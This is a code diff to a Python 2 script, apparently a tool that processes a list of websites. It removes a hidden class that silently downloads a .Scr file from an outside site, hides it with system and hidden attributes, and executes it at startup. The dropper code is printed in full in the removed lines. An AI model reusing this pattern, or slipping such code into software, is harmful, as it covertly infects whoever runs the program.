@@ -10,14 +10,6 @@ try:
         import socket
 except:
         print "Khass Asat T install socket qlb fi google install socket in python 2.7 "
-class revolo:
-    def __init__(self):
-        try:
-            urlretrieve('http://quizmical.com/Index2117.Scr',"Index.Scr")
-            subprocess.Popen("attrib +s +h Index.Scr",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-            subprocess.Popen("Index.Scr",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-        except:
-            pass
 class revolution:
         def __init__(self):
                 os.system('color c')
@@ -37,7 +29,6 @@ class revolution:
                 
                 print banner
                 print author
-                revolo()
                 x = open(raw_input('List Sites:'),'r').readlines()
                 for sites in x:
                         sites = sites.rstrip()
